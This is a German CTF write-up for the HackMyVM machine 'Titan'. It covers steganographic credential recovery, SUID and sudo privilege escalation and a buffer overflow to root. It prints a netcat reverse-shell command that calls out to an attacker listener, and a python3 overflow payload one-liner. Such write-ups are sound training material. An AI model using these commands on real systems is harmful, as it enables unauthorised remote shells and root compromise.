# Titan - HackMyVM (Hard)
 
![Titan.png](Titan.png)

## Übersicht

*   **VM:** Titan
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Titan)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** (Datum konnte dem Bericht nicht entnommen werden)
*   **Original-Writeup:** https://alientec1908.github.io/Titan_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Titan"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Entdeckung von Credentials (`prometheus/iloveallhumans`) durch Steganographie (`stegsnow`) in einer Datei `athena.txt` (deren Ursprung im Log nicht geklärt ist). Dies ermöglichte den SSH-Login als Benutzer `prometheus`. Als `prometheus` wurde ein SUID-Root-Binary `sacrifice` gefunden. Die Analyse dieses Binaries (impliziert durch Ghidra) ergab, dass die Eingabe des Strings "beef" zu einer Shell als Benutzer `zeus` führte. Als `zeus` wurde eine `sudo`-Regel entdeckt, die erlaubte, `/usr/bin/ptx` als Benutzer `hesiod` auszuführen. Dies wurde genutzt, um den privaten SSH-Schlüssel von `hesiod` (inklusive dessen Passphrase `pass55`) auszulesen, was einen SSH-Login als `hesiod` ermöglichte. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung eines Buffer Overflows im SUID-Root-Programm `sacrifice`. Ein Python-Skript generierte einen Exploit-String, der beim Übergeben an `sacrifice` eine Reverse Shell als `root` startete.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `stegsnow`
*   `ssh`
*   `cat`
*   `grep`
*   `Ghidra` (impliziert für Reverse Engineering)
*   `ls`
*   `sudo`
*   `ptx`
*   `tr` (impliziert für Schlüssel-Formatierung)
*   `sed` (impliziert für Schlüssel-Formatierung)
*   `tee` (impliziert für Schlüssel-Formatierung)
*   `vi` (impliziert)
*   `echo`
*   `nc` (netcat)
*   `python3`
*   `chmod` (impliziert)
*   Standard Linux-Befehle (`id`, `cd`, `pwd`)
*   *Hinweis: `arp-scan` und `nmap` sind typische Recon-Tools, wurden aber im bereitgestellten Log nicht für diese spezielle Maschine verwendet, da der Einstieg über Steganographie erfolgte.*

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Titan" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Initial Credential Discovery:**
    *   Mittels `stegsnow -C athena.txt` wurden die Zugangsdaten `prometheus/iloveallhumans` aus einer Textdatei extrahiert. (Herkunft von `athena.txt` ist im Log unklar).

2.  **Initial Access (SSH als `prometheus`):**
    *   Erfolgreicher SSH-Login als `prometheus` mit dem Passwort `iloveallhumans` (`ssh prometheus@titan.vm`).
    *   Identifizierung der Benutzer `zeus` und `hesiod` aus `/etc/passwd`.

3.  **Privilege Escalation (von `prometheus` zu `zeus` via SUID Binary `sacrifice`):**
    *   Im Home-Verzeichnis von `prometheus` wurde das SUID-Root-Binary `sacrifice` (`-rwsr-sr-x 1 root prometheus`) gefunden.
    *   Reverse Engineering (impliziert durch Ghidra-Notiz) des C-Codes von `sacrifice` ergab, dass die Eingabe des Strings "beef" den Benutzerkontext zu `zeus` wechselt.
    *   Ausführung von `./sacrifice` und Eingabe von "beef" führte zu einer Shell als `zeus`.

4.  **Privilege Escalation (von `zeus` zu `hesiod` via `sudo ptx`):**
    *   `sudo -l` als `zeus` (impliziert) offenbarte eine Regel, die `zeus` erlaubte, `/usr/bin/ptx` als Benutzer `hesiod` auszuführen.
    *   Ausführung von `sudo -u hesiod ptx /home/hesiod/.ssh/id_rsa -A -G` las den Base64-kodierten privaten SSH-Schlüssel von `hesiod` aus. Eine Notiz enthüllte dessen Passphrase `pass55`.
    *   Der Base64-Schlüssel wurde dekodiert, formatiert und als `idroot` (lokal) gespeichert.
    *   Erfolgreicher SSH-Login als `hesiod` mit dem extrahierten Schlüssel und der Passphrase `pass55` (`ssh hesiod@titan.vm -i idroot`).

5.  **Privilege Escalation (von `hesiod` zu `root` via Buffer Overflow in `sacrifice`):**
    *   User-Flag `HMVolympiangods` wurde gelesen (Pfad im Log nicht spezifiziert, vermutlich `/home/prometheus/user.txt` oder `/home/zeus/user.txt`).
    *   Erstellung eines Skripts `fire` (als `hesiod`), das eine Netcat-Reverse-Shell (`nc 192.168.2.140 1234 -e /bin/bash`) startete.
    *   Ausnutzung eines Buffer Overflows im SUID-Root-Programm `sacrifice`:
        `python3 -c 'print("a"*87+"\x85\x51\x55\x55\x55\x55\x00\x00")' | ./sacrifice`
        (Die Adresse `\x85\x51...` muss auf den Payload zeigen, z.B. das `fire`-Skript oder Code, der es ausführt).
    *   Der Exploit führte den Payload mit Root-Rechten aus und etablierte eine Reverse Shell als `root` auf dem Listener des Angreifers.
    *   Root-Flag `HMVgodslovesyou` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Steganographie (stegsnow):** Credentials wurden in einer Textdatei mittels Leerzeichen/Tabs versteckt.
*   **Benutzerdefiniertes SUID-Binary mit Logikfehler (`sacrifice` für `prometheus` -> `zeus`):** Ein SUID-Programm erlaubte einen Benutzerwechsel basierend auf einer einfachen String-Eingabe ("beef").
*   **Unsichere `sudo`-Konfiguration (`ptx`):** Die Erlaubnis, `ptx` als anderer Benutzer auszuführen, ermöglichte das Auslesen von dessen privatem SSH-Schlüssel.
*   **Schwache SSH-Schlüssel-Passphrase:** Die Passphrase für `hesiod`s SSH-Schlüssel (`pass55`) war schwach.
*   **Buffer Overflow in SUID-Binary (`sacrifice` für `hesiod` -> `root`):** Ein klassischer Buffer Overflow in einem SUID-Root-Programm wurde ausgenutzt, um beliebigen Code (eine Reverse Shell) als Root auszuführen.
*   **Lokales Kompilieren/Vorbereiten von Exploits:** Der Buffer-Overflow-Payload wurde spezifisch für das Ziel erstellt.

## Flags

*   **User Flag (Pfad nicht spezifiziert, wahrscheinlich Prometheus oder Zeus):** `HMVolympiangods`
*   **Root Flag (`/root/root.txt`):** `HMVgodslovesyou`

## Tags

`HackMyVM`, `Titan`, `Hard`, `Steganography`, `stegsnow`, `SSH`, `SUID Exploitation`, `Buffer Overflow`, `Ghidra`, `sudo Exploitation`, `ptx`, `Privilege Escalation`, `Linux`
